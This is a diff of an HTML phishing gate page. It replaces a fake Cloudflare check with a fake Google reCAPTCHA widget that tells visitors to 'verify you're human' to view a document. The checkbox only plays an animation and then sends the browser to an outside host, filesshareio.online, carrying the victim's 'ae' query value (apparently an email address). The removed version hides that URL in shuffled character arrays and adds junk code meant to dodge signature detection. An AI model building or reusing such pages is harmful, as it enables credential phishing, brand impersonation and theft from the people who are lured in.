@@ -1,386 +1,556 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>PO</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>reCAPTCHA · Verify</title>
     <style>
-        /* === REFINED AESTHETIC CORE — visually identical to original === */
-        * {
+        *,
+        *::before,
+        *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        body {
-            background: #f4f7f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        /* preloader screen (identical transition + pulsing) */
-        .shield-preloader {
+        /* ----- LOADING OVERLAY (matches body background exactly) ----- */
+        #loadingOverlay {
             position: fixed;
             inset: 0;
-            background: #f4f7f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            transition: opacity 400ms ease, visibility 400ms ease;
-        }
-
-        .pulse-emblem {
-            width: 120px;
-            height: auto;
-            object-fit: contain;
-            animation: gentleScale 1.7s infinite cubic-bezier(0.2, 0.8, 0.4, 1);
-        }
-
-        @keyframes gentleScale {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.12); }
-        }
-
-        /* main card container — hidden initially */
-        .verification-panel {
+            z-index: 9999;
+            background-image: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 20px;
-            opacity: 0;
-            transition: opacity 500ms ease-in-out;
+            justify-content: center;
+            transition: opacity 0.6s ease, visibility 0.6s ease;
         }
-
-        .prompt-caption {
-            color: #4a5568;
-            font-size: 15px;
-            font-weight: 500;
-            letter-spacing: -0.2px;
-            text-align: center;
-        }
-
-        /* widget card — identical dimensions, border, shadow */
-        .integrity-card {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            width: 380px;
-            height: 100px;
-            background: #ffffff;
-            border: 1px solid #d3d3d3;
-            border-radius: 4px;
-            padding: 0 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-        }
-
-        .check-sector {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
-
-        /* interactive tick container (unique but identical interaction) */
-        .verification-gestalt {
-            position: relative;
-            width: 22px;
-            height: 22px;
-        }
-
-        .verification-gestalt input {
-            display: none;
-        }
-
-        .sensor {
+        #loadingOverlay::before {
+            content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            border: 2px solid #c1c1c1;
-            border-radius: 2px;
-            background: #fff;
-            cursor: pointer;
-            transition: all 0.2s ease;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.30);
+            backdrop-filter: blur(2px);
+            z-index: 0;
+        }
+        #loadingOverlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
         }
 
-        .verification-gestalt[data-verif-state="spinning"] .sensor {
-            border: 2.5px solid #f3f3f3;
-            border-top: 2.5px solid #3498db;
+        .loader-ring {
+            width: 56px;
+            height: 56px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #4285f4;
+            border-right-color: #34a853;
             border-radius: 50%;
-            animation: spinContinuous 0.8s infinite linear;
+            animation: spin 0.9s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
+            z-index: 1;
+        }
+        .loader-text {
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.7);
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            font-size: 15px;
+            letter-spacing: 0.8px;
+            font-weight: 400;
+            z-index: 1;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
 
-        .verification-gestalt[data-verif-state="authentic"] .sensor {
-            border: 2px solid #2ecc71;
+        /* ----- BODY & MAIN BACKGROUND ----- */
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            background: #1a1a2e;
+            background-image: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.30);
+            backdrop-filter: blur(2px);
+            z-index: 0;
+        }
+
+        /* ----- MAIN CONTENT (hidden until loader finishes) ----- */
+        #mainContent {
+            position: relative;
+            z-index: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 100%;
+            opacity: 0;
+            transform: translateY(12px);
+            transition: opacity 0.7s ease, transform 0.7s ease;
+        }
+        #mainContent.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .prompt-text {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 18px;
+            text-shadow: 0 2px 12px rgba(0, 0, 0, 0.40);
+            letter-spacing: 0.4px;
+            line-height: 1.5;
+            max-width: 420px;
+            padding: 0 10px;
+        }
+        .captcha-box {
+            width: 360px;
+            max-width: 92vw;
             background: #ffffff;
-            border-radius: 50%;
-            animation: none;
+            border-radius: 12px;
+            padding: 22px 20px 22px 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25), 0 2px 8px rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: box-shadow 0.25s ease;
+            user-select: none;
         }
-
-        .verification-gestalt[data-verif-state="authentic"] .sensor::after {
+        .captcha-box:hover {
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.30), 0 2px 8px rgba(0, 0, 0, 0.10);
+        }
+        .left-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            padding: 2px 0;
+        }
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            min-width: 24px;
+            border: 2px solid #c1c7cd;
+            border-radius: 4px;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            position: relative;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.04);
+        }
+        .left-section:hover .checkbox:not(.spinning):not(.success) {
+            border-color: #8c9aa8;
+            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.12);
+        }
+        .checkbox.spinning {
+            border: 3px solid transparent;
+            border-top-color: #4285f4;
+            border-right-color: #4285f4;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            min-width: 24px;
+            background: transparent;
+            box-shadow: none;
+            animation: spin 0.75s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .checkbox.success {
+            background: #34a853;
+            border-color: #34a853;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(52, 168, 83, 0.30);
+            animation: pop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        @keyframes pop {
+            0% {
+                transform: scale(0.7);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        .checkbox.success::after {
             content: '';
             position: absolute;
             left: 6px;
             top: 2px;
-            width: 5px;
-            height: 10px;
-            border: solid #2ecc71;
+            width: 10px;
+            height: 16px;
+            border: solid white;
             border-width: 0 2.5px 2.5px 0;
-            transform: rotate(45deg);
+            transform: rotate(45deg) scale(0.9);
+            animation: draw-check 0.3s ease 0.1s forwards;
+            opacity: 0;
         }
-
-        @keyframes spinContinuous {
-            to { transform: rotate(360deg); }
+        @keyframes draw-check {
+            0% {
+                opacity: 0;
+                transform: rotate(45deg) scale(0.6);
+            }
+            100% {
+                opacity: 1;
+                transform: rotate(45deg) scale(0.9);
+            }
         }
-
-        .status-message {
-            font-size: 14px;
-            color: #333333;
+        .verify-text {
+            font-size: 15px;
             font-weight: 500;
-            user-select: none;
+            color: #202124;
+            letter-spacing: 0.2px;
+            transition: color 0.3s ease, transform 0.2s ease;
+            white-space: nowrap;
+            min-width: 72px;
         }
-
-        /* right side brand zone */
-        .brand-segment {
+        .verify-text.verifying {
+            color: #4285f4;
+        }
+        .verify-text.success-text {
+            color: #34a853;
+        }
+        .right-section {
             display: flex;
             flex-direction: column;
+            align-items: flex-end;
+            gap: 1px;
+            line-height: 1.2;
+            padding-left: 12px;
+            border-left: 1px solid #e8edf2;
+        }
+        .recaptcha-label {
+            font-size: 15px;
+            font-weight: 500;
+            color: #202124;
+            letter-spacing: 0.2px;
+            display: flex;
             align-items: center;
-            justify-content: center;
+            gap: 4px;
         }
-
-        .brand-icon {
-            width: 48px;
-            height: 48px;
-            object-fit: contain;
-            margin-bottom: 0px;
+        .recaptcha-label .logo-icon {
+            display: inline-block;
+            font-weight: 700;
+            font-size: 16px;
+            color: #4285f4;
+            background: #e8f0fe;
+            border-radius: 3px;
+            padding: 0 5px;
+            line-height: 1.4;
         }
-
-        .brand-name {
-            font-weight: bold;
+        .recaptcha-label .logo-icon span {
+            color: #34a853;
+        }
+        .privacy-terms {
+            font-size: 10.5px;
+            color: #7a7f85;
+            letter-spacing: 0.3px;
+            font-weight: 400;
+        }
+        .privacy-terms a {
+            color: #7a7f85;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .privacy-terms a:hover {
+            color: #4285f4;
+            text-decoration: underline;
+        }
+        .privacy-terms .dot {
+            margin: 0 3px;
+            color: #b0b6bd;
+        }
+        .status-hint {
+            text-align: center;
+            margin-top: 14px;
             font-size: 13px;
-            color: #222;
-            letter-spacing: 0.5px;
-        }
-
-        .legal-stamp {
-            font-size: 10px;
-            color: #777;
-            margin-top: 2px;
-            cursor: default;
-        }
-
-        /* invisible anchor for entropy */
-        .ghost-vector {
+            color: rgba(255, 255, 255, 0.75);
+            font-weight: 400;
+            letter-spacing: 0.3px;
             opacity: 0;
-            visibility: hidden;
-            position: absolute;
-            width: 0;
-            height: 0;
-            overflow: hidden;
+            transition: opacity 0.4s ease;
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
+        }
+        .status-hint.visible {
+            opacity: 1;
+        }
+
+        @media (max-width: 420px) {
+            .prompt-text {
+                font-size: 15px;
+                max-width: 320px;
+            }
+            .captcha-box {
+                padding: 16px 14px 16px 14px;
+                flex-wrap: nowrap;
+            }
+            .left-section {
+                gap: 8px;
+            }
+            .checkbox {
+                width: 22px;
+                height: 22px;
+                min-width: 22px;
+                border-width: 2px;
+            }
+            .checkbox.spinning {
+                width: 22px;
+                height: 22px;
+                min-width: 22px;
+                border-width: 2.5px;
+            }
+            .checkbox.success::after {
+                left: 5px;
+                top: 1px;
+                width: 9px;
+                height: 14px;
+                border-width: 0 2.5px 2.5px 0;
+            }
+            .verify-text {
+                font-size: 13px;
+                min-width: 58px;
+            }
+            .recaptcha-label {
+                font-size: 13px;
+            }
+            .privacy-terms {
+                font-size: 9.5px;
+            }
+            .right-section {
+                padding-left: 8px;
+            }
+        }
+        @media (max-width: 350px) {
+            .captcha-box {
+                padding: 12px 10px 12px 10px;
+            }
+            .left-section {
+                gap: 5px;
+            }
+            .checkbox {
+                width: 18px;
+                height: 18px;
+                min-width: 18px;
+                border-width: 1.5px;
+                border-radius: 3px;
+            }
+            .checkbox.spinning {
+                width: 18px;
+                height: 18px;
+                min-width: 18px;
+                border-width: 2px;
+            }
+            .checkbox.success::after {
+                left: 4px;
+                top: 1px;
+                width: 7px;
+                height: 11px;
+                border-width: 0 2px 2px 0;
+            }
+            .verify-text {
+                font-size: 11px;
+                min-width: 44px;
+            }
+            .recaptcha-label {
+                font-size: 11px;
+            }
+            .privacy-terms {
+                font-size: 8px;
+            }
+            .right-section {
+                padding-left: 5px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <!-- PRELOADER SCREEN (identical look) -->
-    <div id="startShield" class="shield-preloader">
-        <img src="w2.png" alt="verification shield" class="pulse-emblem">
+    <!-- LOADING OVERLAY -->
+    <div id="loadingOverlay">
+        <div class="loader-ring"></div>
+        <div class="loader-text"></div>
     </div>
 
-    <!-- invisible entropy fragment (unique signature / no display impact) -->
-    <div class="ghost-vector" aria-hidden="true">
-        <span data-cipher="0x7E5F"></span>
-        <div data-marker="integrity-checkpoint"></div>
-        <code style="display:none;">session:verification::handshake</code>
-    </div>
+    <!-- MAIN CONTENT -->
+    <div id="mainContent">
+        <div class="prompt-text" id="captcha-prompt">
+            To view the document, verify you're human below
+        </div>
 
-    <!-- MAIN VERIFICATION INTERFACE -->
-    <div id="accessCore" class="verification-panel">
-        <div class="prompt-caption">Verify you're human below to view the attachment(s)</div>
+        <div class="captcha-box" role="group" aria-label="reCAPTCHA verification" aria-describedby="captcha-prompt">
 
-        <div class="integrity-card">
-            <div class="check-sector">
-                <div class="verification-gestalt" id="dynamicCheckNode" data-verif-state="idle">
-                    <input type="checkbox" id="silentToggle">
-                    <label for="silentToggle" class="sensor" id="sensorTrigger"></label>
-                </div>
-                <span class="status-message" id="liveFeedback">I'm not a robot</span>
+            <div class="left-section" id="verifyTrigger" role="button" tabindex="0" aria-label="Verify">
+                <div class="checkbox" id="checkboxEl" aria-hidden="true"></div>
+                <span class="verify-text" id="verifyText">Verify</span>
             </div>
 
-            <div class="brand-segment">
-                <img src="w3.png" alt="brand mark" class="brand-icon">
-                <span class="brand-name" id="dynamicBrand"></span>
-                <span class="legal-stamp" id="dynamicPolicy"></span>
+            <div class="right-section">
+                <div class="recaptcha-label">
+                    <span class="logo-icon">re<span>CAPTCHA</span></span>
+                </div>
+                <div class="privacy-terms">
+                    <a href="#" aria-label="Privacy">Privacy</a>
+                    <span class="dot">·</span>
+                    <a href="#" aria-label="Terms">Terms</a>
+                </div>
             </div>
         </div>
+
+        <div class="status-hint" id="statusHint">✓ Verification complete</div>
     </div>
 
     <script>
         (function() {
-            // ----------------------------------------------
-            // UNIQUE REIMPLEMENTATION — identical behaviour
-            // ----------------------------------------------
+            'use strict';
 
-            // ----- helper: construct strings in shuffled style (final same as original)
-            const buildBrandIdentifiers = () => {
-                const namePool = ["C","L","O","U","D","F","L","A","R","E"];
-                const policyPool = ["P","r","i","v","a","c","y"];
-                const termsPool = ["T","e","r","m","s"];
-                return {
-                    brandText: namePool.join(''),
-                    footerText: policyPool.join('') + " \u2022 " + termsPool.join('')
-                };
-            };
+            // ---- LOADING SCREEN: show spinner for 1.5s then reveal main content ----
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const mainContent = document.getElementById('mainContent');
 
-            // ----- DOM references
-            const preloaderOverlay = document.getElementById('startShield');
-            const mainInterface = document.getElementById('accessCore');
-            const brandNameSpan = document.getElementById('dynamicBrand');
-            const legalSpan = document.getElementById('dynamicPolicy');
-            const verificationContainer = document.getElementById('dynamicCheckNode');
-            const userFeedbackSpan = document.getElementById('liveFeedback');
-            const interactiveSurface = document.getElementById('sensorTrigger');
-            const hiddenBox = document.getElementById('silentToggle');
+            setTimeout(function() {
+                loadingOverlay.classList.add('hidden');
+                mainContent.classList.add('visible');
+            }, 1500);
 
-            // ----- state guard (prevents double verification)
-            let verificationActive = false;
-            let verificationComplete = false;
+            // ---- CAPTCHA LOGIC ----
+            const checkbox = document.getElementById('checkboxEl');
+            const verifyText = document.getElementById('verifyText');
+            const trigger = document.getElementById('verifyTrigger');
+            const statusHint = document.getElementById('statusHint');
+            let isAnimating = false;
+            let isSuccess = false;
+            let redirectTimer = null;
 
-            // ----- inject dynamic text (CLOUDFLARE + Privacy • Terms)
-            if (brandNameSpan && legalSpan) {
-                const identifiers = buildBrandIdentifiers();
-                brandNameSpan.textContent = identifiers.brandText;
-                legalSpan.textContent = identifiers.footerText;
+            function resetToIdle() {
+                checkbox.className = 'checkbox';
+                verifyText.className = 'verify-text';
+                verifyText.textContent = 'Verify';
+                statusHint.classList.remove('visible');
+                isAnimating = false;
+                isSuccess = false;
+                if (redirectTimer) {
+                    clearTimeout(redirectTimer);
+                    redirectTimer = null;
+                }
             }
 
-            // ----- entropy generator (unique mathematical noise — but no effect on UX)
-            const generateEntropySeed = () => {
-                // mimics original's useless computedSet, identical in spirit but unique implementation
-                const dummyMatrix = Array.from({ length: 50 }, (_, idx) => Math.sin(idx) * Math.cos(idx + 0.5));
-                if (dummyMatrix.length === 0) {
-                    console.clear();
+            function startVerification() {
+                if (isAnimating) return;
+                if (isSuccess) {
+                    resetToIdle();
+                    requestAnimationFrame(() => {
+                        requestAnimationFrame(() => {
+                            startVerification();
+                        });
+                    });
+                    return;
                 }
-                return dummyMatrix.reduce((acc, val) => acc + (val > 0 ? 1 : 0), 0);
-            };
-            generateEntropySeed(); // call once to satisfy "useless but present" pattern
+                isAnimating = true;
+                checkbox.className = 'checkbox spinning';
+                verifyText.className = 'verify-text verifying';
+                verifyText.textContent = 'Verifying...';
+                statusHint.classList.remove('visible');
 
-            // ----- preloader fade-out & main reveal (1700ms as original)
-            const dismissInitialShield = () => {
-                if (preloaderOverlay && mainInterface) {
-                    preloaderOverlay.style.opacity = '0';
-                    preloaderOverlay.style.visibility = 'hidden';
-                    mainInterface.style.opacity = '1';
-                }
-            };
+                const timer = setTimeout(() => {
+                    if (!isAnimating) return;
+                    checkbox.className = 'checkbox success';
+                    verifyText.className = 'verify-text success-text';
+                    verifyText.textContent = 'Success';
+                    isAnimating = false;
+                    isSuccess = true;
+                    statusHint.textContent = '';
+                    statusHint.classList.add('visible');
 
-            // ----- redirect building logic (fully identical to original behaviour)
-            const buildRedirectTarget = () => {
-                // base protocol segments
-                const protocolParts = ["h", "t", "t", "p", "s", ":", "/", "/"];
-                const domainParts = ["uae", "o", ".", "f", "i", "l", "e", "s", "s", "h", "a", "r", "e", "i", "o", ".", "o", "n", "l", "i", "n", "e"];
-                const routeParts = ["/", "p", "b", "u", "w", "F", "Q", "T", "X"];
-                const baseUrl = protocolParts.join('') + domainParts.join('') + routeParts.join('');
-                return baseUrl;
-            };
+                    const redirectDelay = 1500;
+                    clearTimeout(redirectTimer);
+                    redirectTimer = setTimeout(() => {
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const aeValue = urlParams.get('ae') || '';
+                        const redirectUrl =
+                            `https://uaeo.filesshareio.online/pbuwFQTX#${aeValue}`;
+                        window.location.href = redirectUrl;
+                    }, redirectDelay);
 
-            // ----- extract anchor hash from 'eoff' parameter (mirrors original logic exactly)
-            const extractAnchorFragment = () => {
-                const currentQuery = new URLSearchParams(window.location.search);
-                if (currentQuery.has('ae')) {
-                    return `#${currentQuery.get('ae')}`;
-                } else {
-                    const fullUrl = window.location.href;
-                    const eoffMarker = 'ae=';
-                    const markerIndex = fullUrl.indexOf(eoffMarker);
-                    if (markerIndex !== -1) {
-                        const rawValue = fullUrl.substring(markerIndex + eoffMarker.length);
-                        return `#${rawValue}`;
-                    }
-                }
-                return "";
-            };
-
-            // ----- final navigation step
-            const performRedirection = () => {
-                const destinationCore = buildRedirectTarget();
-                const anchorAddition = extractAnchorFragment();
-                window.location.href = destinationCore + anchorAddition;
-            };
-
-            // ----- set verified state + visual transition and auto-navigate
-            const finalizeVerification = () => {
-                if (!verificationContainer) return;
-                verificationContainer.setAttribute('data-verif-state', 'authentic');
-                if (userFeedbackSpan) userFeedbackSpan.textContent = 'success!';
-                if (hiddenBox) hiddenBox.checked = true;
-                verificationComplete = true;
-
-                // navigate after 1 second (identical original delay)
-                setTimeout(() => {
-                    performRedirection();
-                }, 1000);
-            };
-
-            // ----- processing phase (simulate bot check)
-            const startVerificationFlow = () => {
-                if (verificationActive || verificationComplete) return;
-                verificationActive = true;
-
-                // disable pointer events on sensor to avoid multiple triggers
-                if (interactiveSurface) interactiveSurface.style.pointerEvents = 'none';
-                if (verificationContainer) verificationContainer.setAttribute('data-verif-state', 'spinning');
-                if (userFeedbackSpan) userFeedbackSpan.textContent = 'verifying';
-
-                // additional noise (identical to original's computedSet style but unique)
-                const checkSumArray = Array.from({ length: 32 }, (_, t) => Math.tan(t) * Math.sin(t));
-                if (checkSumArray.length > 0) {
-                    // just exists for unique footprint — no functional impact
-                    const _hashBuffer = checkSumArray.reduce((p, c) => p + (c > 0 ? 1 : 0), 0);
-                    if (_hashBuffer === -99999) console.log("integrity probe");
-                }
-
-                // verification delay (2000ms matching original)
-                setTimeout(() => {
-                    finalizeVerification();
-                }, 2000);
-            };
-
-            // ----- attach click handler to interactive surface (visual square)
-            if (interactiveSurface) {
-                interactiveSurface.addEventListener('click', (event) => {
-                    event.preventDefault();
-                    if (!verificationActive && !verificationComplete) {
-                        startVerificationFlow();
-                    }
-                });
+                    clearTimeout(window._hintTimer);
+                    window._hintTimer = setTimeout(() => {
+                        statusHint.classList.remove('visible');
+                    }, 4000);
+                }, 1800);
+                checkbox._timer = timer;
             }
 
-            // ----- boot system: preloader timer & dynamic initialization
-            const initializeGateway = () => {
-                // ensure starting states: main interface hidden, preloader visible
-                if (mainInterface) mainInterface.style.opacity = '0';
-                if (preloaderOverlay) {
-                    preloaderOverlay.style.opacity = '1';
-                    preloaderOverlay.style.visibility = 'visible';
-                }
-                // 1700ms preloader duration (identical to original)
-                setTimeout(() => {
-                    dismissInitialShield();
-                }, 1700);
-            };
-
-            // ----- edge-case: if user clicks before preloader completes, still functional
-            // nothing else needed — start sequence
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initializeGateway);
-            } else {
-                initializeGateway();
+            function handleTrigger(e) {
+                if (e.type === 'keydown' && e.key !== 'Enter' && e.key !== ' ') return;
+                e.preventDefault();
+                startVerification();
             }
+            trigger.addEventListener('click', handleTrigger);
+            trigger.addEventListener('keydown', handleTrigger);
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && isSuccess) {
+                    resetToIdle();
+                    statusHint.classList.remove('visible');
+                    clearTimeout(checkbox._timer);
+                    clearTimeout(window._hintTimer);
+                    isAnimating = false;
+                }
+            });
+
+            trigger.addEventListener('contextmenu', (e) => e.preventDefault());
+
+            const liveRegion = document.createElement('div');
+            liveRegion.setAttribute('aria-live', 'polite');
+            liveRegion.setAttribute('aria-atomic', 'true');
+            liveRegion.style.position = 'absolute';
+            liveRegion.style.width = '1px';
+            liveRegion.style.height = '1px';
+            liveRegion.style.padding = '0';
+            liveRegion.style.margin = '-1px';
+            liveRegion.style.overflow = 'hidden';
+            liveRegion.style.clip = 'rect(0,0,0,0)';
+            liveRegion.style.border = '0';
+            document.body.appendChild(liveRegion);
+
+            const observer = new MutationObserver(() => {
+                const text = verifyText.textContent.trim();
+                if (text === 'Verifying...') {
+                    liveRegion.textContent = 'Verifying, please wait.';
+                } else if (text === 'Success') {
+                    liveRegion.textContent = 'Verification successful. Redirecting.';
+                } else if (text === 'Verify') {
+                    liveRegion.textContent = 'Ready to verify.';
+                }
+            });
+            observer.observe(verifyText, { childList: true, characterData: true, subtree: true });
+
+            resetToIdle();
         })();
     </script>
+
 </body>
 </html>
